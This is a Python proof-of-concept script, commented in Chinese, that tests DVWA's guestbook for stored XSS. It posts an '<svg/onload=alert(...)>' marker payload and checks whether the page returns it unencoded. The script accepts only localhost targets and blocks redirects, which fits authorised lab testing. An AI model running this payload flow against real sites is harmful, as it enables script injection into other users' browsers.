#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XSS-005 本地存储型 XSS 验证草案（仅限 localhost / 127.0.0.1 / [::1]）。

不跟随重定向；会话 Cookie 由 --cookie-file 在运行时提供，不写入版本库、不打印。
脚本只核对服务端是否把 payload 原样输出，不执行 JavaScript。
"""

import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
PAGE_PATH = "/vulnerabilities/xss_s/"
DEFAULT_MARKER = "XSS-005-POC"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """拒绝自动跟随 3xx，避免被带到授权范围之外。"""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "redirect blocked (not followed): %s" % newurl, headers, fp
        )


def parse_args():
    parser = argparse.ArgumentParser(description="XSS-005 local-only stored XSS check")
    parser.add_argument(
        "--base-url", default="http://127.0.0.1/dvwa/", help="DVWA 站点根地址"
    )
    parser.add_argument(
        "--cookie-file", required=True,
        help="包含已登录会话 Cookie 头文本的本地文件（不得入库）",
    )
    parser.add_argument(
        "--security-level", default="low",
        choices=["low", "medium", "high", "impossible"],
        help="写入 security Cookie 的安全等级，默认 low",
    )
    parser.add_argument("--name", default="poc", help="留言 Name 字段值")
    parser.add_argument("--marker", default=DEFAULT_MARKER, help="无害验证标记")
    parser.add_argument("--timeout", type=float, default=10.0, help="单次请求超时秒数")
    return parser.parse_args()


def validate_target(base_url):
    parts = urllib.parse.urlsplit(base_url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("refusing non-HTTP(S) scheme: %r" % (parts.scheme,))
    host = (parts.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        raise SystemExit("target host must be localhost/127.0.0.1/[::1], got %r" % (host,))
    return host


def read_cookie_file(path):
    try:
        with open(path, "r", encoding="utf-8") as handle:
            raw = handle.read().strip()
    except OSError as exc:
        raise SystemExit("cannot read cookie file: %s" % exc)
    if not raw:
        raise SystemExit("cookie file is empty")
    return raw.splitlines()[0].strip()


def merge_security_cookie(cookie_header, level):
    kept = []
    for part in cookie_header.split(";"):
        item = part.strip()
        if not item:
            continue
        if item.split("=", 1)[0].strip().lower() == "security":
            continue
        kept.append(item)
    kept.append("security=%s" % level)
    return "; ".join(kept)


def fetch(opener, url, cookie, timeout, form=None):
    data = urllib.parse.urlencode(form).encode("utf-8") if form is not None else None
    request = urllib.request.Request(
        url, data=data, method="POST" if data is not None else "GET"
    )
    request.add_header("Cookie", cookie)
    request.add_header("User-Agent", "xss005-local-poc/1.0")
    if data is not None:
        request.add_header("Content-Type", "application/x-www-form-urlencoded")
    return opener.open(request, timeout=timeout)


def safe_context(text, needle, span=120):
    index = text.find(needle)
    if index < 0:
        return ""
    start = max(0, index - span)
    end = min(len(text), index + len(needle) + span)
    return text[start:end].replace("\r", " ").replace("\n", " ")


def load(url, cookie, timeout, opener):
    with fetch(opener, url, cookie, timeout) as response:
        return response.getcode(), response.read().decode("utf-8", "replace")


def main():
    args = parse_args()
    validate_target(args.base_url)
    cookie = merge_security_cookie(read_cookie_file(args.cookie_file), args.security_level)
    page_url = args.base_url.rstrip("/") + PAGE_PATH
    payload = "<svg/onload=alert('%s')>" % args.marker

    opener = urllib.request.build_opener(NoRedirect)
    opener.addheaders = []

    try:
        status_before, page_before = load(page_url, cookie, args.timeout, opener)
    except urllib.error.HTTPError as exc:
        print("HTTP error %s while loading form page (redirects are not followed)" % exc.code)
        return 2
    except urllib.error.URLError as exc:
        print("connection error: %s" % exc.reason)
        return 2
    except OSError as exc:
        print("socket/timeout error: %s" % exc)
        return 2

    for needle in ('name="txtName"', 'name="mtxMessage"', 'name="btnSign"'):
        if needle not in page_before:
            print("form field %s not found; check authentication/session and URL" % needle)
            return 2
    print("GET form page: HTTP %s" % status_before)

    form = {"txtName": args.name, "mtxMessage": payload, "btnSign": "Sign Guestbook"}
    try:
        with fetch(opener, page_url, cookie, args.timeout, form=form) as response:
            status_post = response.getcode()
            page_post = response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        print("HTTP error %s on POST (redirects are not followed)" % exc.code)
        return 2
    except urllib.error.URLError as exc:
        print("connection error on POST: %s" % exc.reason)
        return 2
    except OSError as exc:
        print("socket/timeout error on POST: %s" % exc)
        return 2

    try:
        status_after, page_after = load(page_url, cookie, args.timeout, opener)
    except urllib.error.HTTPError as exc:
        print("HTTP error %s on verification GET (redirects are not followed)" % exc.code)
        return 2
    except urllib.error.URLError as exc:
        print("connection error on verification GET: %s" % exc.reason)
        return 2
    except OSError as exc:
        print("socket/timeout error on verification GET: %s" % exc)
        return 2

    escaped_marker = "&lt;svg/onload="
    post_hits = page_post.count(payload)
    get_hits = page_after.count(payload)
    print("POST: HTTP %s; verification GET: HTTP %s" % (status_post, status_after))
    print("POST response: raw_payload_count=%d escaped_payload_seen=%s"
          % (post_hits, escaped_marker in page_post))
    print("GET after POST: raw_payload_count=%d escaped_payload_seen=%s"
          % (get_hits, escaped_marker in page_after))
    if get_hits:
        print("context: %s" % safe_context(page_after, payload))

    stored = get_hits > 0 and escaped_marker not in page_after
    if stored:
        print("observation: payload persisted and returned unencoded; browser execution not tested here")
        return 0
    print("observation: no unencoded persisted payload found; this run is not proof of absence")
    return 1


if __name__ == "__main__":
    sys.exit(main())
